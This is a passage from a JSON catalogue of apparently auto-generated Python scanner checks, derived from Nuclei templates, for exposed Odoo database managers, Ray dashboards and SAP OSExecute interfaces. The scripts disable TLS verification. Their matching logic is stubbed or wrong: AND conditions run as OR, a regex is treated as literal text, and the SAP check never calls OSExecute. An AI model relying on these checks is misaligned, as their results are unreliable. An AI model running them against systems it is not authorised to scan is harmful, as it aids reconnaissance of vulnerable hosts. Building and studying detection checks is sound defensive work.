        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: odoo-unprotected-database\nName: Odoo - Unprotected Database\nSeverity: critical\nDescription: The system has an Odoo application whose database manager is unprotected, indicating potential unauthorized access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_odoo_unprotected_database:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"odoo-unprotected-database\"\n    SEVERITY = \"critical\"\n    NAME = \"Odoo - Unprotected Database\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Warning, your Odoo database manager is not protected.' | mot(s) 'The database manager has been disabled by the administrator' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Warning, your Odoo database manager is not protected.', 'The database manager has been disabled by the administrator']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Odoo - Unprotected Database\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_odoo_unprotected_database(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: odoo-unprotected-database\nName: Odoo - Unprotected Database\nSeverity: critical\nDescription: The system has an Odoo application whose database manager is unprotected, indicating potential unauthorized access.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_odoo_unprotected_database:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"odoo-unprotected-database\"\n    SEVERITY = \"critical\"\n    NAME = \"Odoo - Unprotected Database\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Warning, your Odoo database manager is not protected.' | mot(s) 'The database manager has been disabled by the administrator' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Warning, your Odoo database manager is not protected.', 'The database manager has been disabled by the administrator']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Odoo - Unprotected Database\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_odoo_unprotected_database(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "odoo",
          "database",
          "unauth",
          "misconfig",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_ray_dashboard",
        "name": "Ray Dashboard Exposure",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Ray Dashboard is exposed.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Ray Dashboard' | status HTTP [200]",
        "parameters": [
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ray-dashboard\nName: Ray Dashboard Exposure\nSeverity: critical\nDescription: Ray Dashboard is exposed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ray_dashboard:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ray-dashboard\"\n    SEVERITY = \"critical\"\n    NAME = \"Ray Dashboard Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Ray Dashboard' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Ray Dashboard']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ray Dashboard Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ray_dashboard(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: ray-dashboard\nName: Ray Dashboard Exposure\nSeverity: critical\nDescription: Ray Dashboard is exposed.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_ray_dashboard:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"ray-dashboard\"\n    SEVERITY = \"critical\"\n    NAME = \"Ray Dashboard Exposure\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Ray Dashboard' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Ray Dashboard']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Ray Dashboard Exposure\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_ray_dashboard(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "misconfig",
          "exposure",
          "ray",
          "discovery"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_sap_osexecute_rce",
        "name": "SAPControl OSExecute - Remote Code Execution (RCE)",
        "language": "Python",
        "famille": "Misconfiguration",
        "description": "Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'OSExecuteResponse, <output>' | regex ['uid=[0-9]+\\\\('] | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sap-osexecute-rce\nName: SAPControl OSExecute - Remote Code Execution (RCE)\nSeverity: critical\nDescription: Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sap_osexecute_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sap-osexecute-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"SAPControl OSExecute - Remote Code Execution (RCE)\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'OSExecuteResponse, <output>' | regex ['uid=[0-9]+\\\\\\\\('] | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['OSExecuteResponse, <output>', 'uid=[0-9]+\\\\\\\\(']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"SAPControl OSExecute - Remote Code Execution (RCE)\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_sap_osexecute_rce(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: sap-osexecute-rce\nName: SAPControl OSExecute - Remote Code Execution (RCE)\nSeverity: critical\nDescription: Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_sap_osexecute_rce:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"sap-osexecute-rce\"\n    SEVERITY = \"critical\"\n    NAME = \"SAPControl OSExecute - Remote Code Execution (RCE)\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname 